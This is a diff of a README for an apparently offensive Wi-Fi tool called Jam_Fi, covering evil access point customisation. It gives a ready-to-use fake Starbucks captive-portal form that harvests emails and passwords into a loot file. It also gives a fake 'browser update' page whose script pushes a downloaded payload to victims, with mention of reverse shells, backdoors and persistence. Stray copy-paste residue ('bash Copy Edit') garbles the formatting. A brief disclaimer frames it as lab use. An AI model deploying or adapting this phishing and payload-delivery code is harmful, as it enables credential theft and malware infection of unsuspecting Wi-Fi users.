@@ -109,51 +109,48 @@ Edit the scan delay inside jam_fi.py (look for time.sleep() under channel_hopper
 Lowering sleep delay to 0.2 or less can speed things up, but may increase CPU usage.
 
 👿 Evil AP Customization
-
-🎨 Customize the Captive Portal:
-
+🎨 Customize the Captive Portal
 Edit this file to make your own fake login page:
 
+bash
+Copy
+Edit
 loot/login.html
+Wanna make it look like Starbucks? Just change the login.html body like this:
 
-Wanna make it look like Starbucks? Just change the login.html body:
-
-" <h2>Welcome to Starbucks Free Wi-Fi</h2>
-<p>Please sign in to continue</p>
-<form method="POST" action="/login">
-  <input type="text" name="username" placeholder="Email"><br>
-  <input type="password" name="password" placeholder="Wi-Fi Password"><br>
-  <input type="submit" value="Connect">
-</form> "
-
+<pre> ```html <h2>Welcome to Starbucks Free Wi-Fi</h2> <p>Please sign in to continue</p> <form method="POST" action="/login"> <input type="text" name="username" placeholder="Email"><br> <input type="password" name="password" placeholder="Wi-Fi Password"><br> <input type="submit" value="Connect"> </form> ``` </pre>
 You can view your collected credentials in:
 
+bash
+Copy
+Edit
 loot/creds.txt
-
 🔐 Advanced Hack: Fake Browser Update + Payload (Optional)
+JamFi lets you simulate a fake browser update prompt using pure HTML + JavaScript — no Flipper or Rubber Ducky required!
 
-Jam_Fi lets you simulate a fake browser update prompt using pure HTML + JavaScript — no Flipper or Rubber Ducky required. Once a device connects to your Evil AP, you can redirect them
+Once a device connects to your Evil AP, redirect them to a custom update page by editing:
 
-to a custom update page that looks legit and even downloads a file of your choosing. You control it via loot/injection.html. Here's a simple example:
+bash
+Copy
+Edit
+loot/injection.html
+Here’s a simple example:
 
-<!-- loot/injection.html -->
-<h2>🔒 Browser Update Required</h2>
-<p>To continue browsing, please install the latest security patch.</p>
-<button onclick="downloadUpdate()">Update Now</button>
-<script>
-function downloadUpdate() {
-  const a = document.createElement('a');
-  a.href = 'http://10.0.0.1/fake_update.exe';  // Customize your payload here
-  a.download = 'update.exe';
-  document.body.appendChild(a);
-  a.click();
-}
-</script>
+<pre> ```html <!-- loot/injection.html --> <h2>🔒 Browser Update Required</h2> <p>To continue browsing, please install the latest security patch.</p> <button onclick="downloadUpdate()">Update Now</button> <script> function downloadUpdate() { const a = document.createElement('a'); a.href = 'http://10.0.0.1/fake_update.exe'; // Customize your payload here a.download = 'update.exe'; document.body.appendChild(a); a.click(); } </script>
+bash
+Copy
+Edit
+</pre>
 
-Just place your payload or tool (like netcat, reverse_shell.exe, etc.) in the loot/ folder as fake_update.exe.
+Place your payload in the `loot/` folder as:
 
-You now have a simulated Remote Code Execution (RCE) opportunity: once the user runs your downloaded file, you can initiate reverse shells or persistence — depending on your lab setup.
+fake_update.exe
 
+yaml
+Copy
+Edit
+
+Now you have a simulated **Remote Code Execution (RCE)** opportunity: if the victim downloads and runs the file, you can trigger reverse shells, backdoors, or persistence (depending on your setup).
 ⚠️ Jam_Fi does not include any malicious payloads — it's up to you to create safe, controlled experiments in your own lab. This is where red teamers, CTF lovers, and students can shine. 
 
 ## 💼 The loot/ Folder
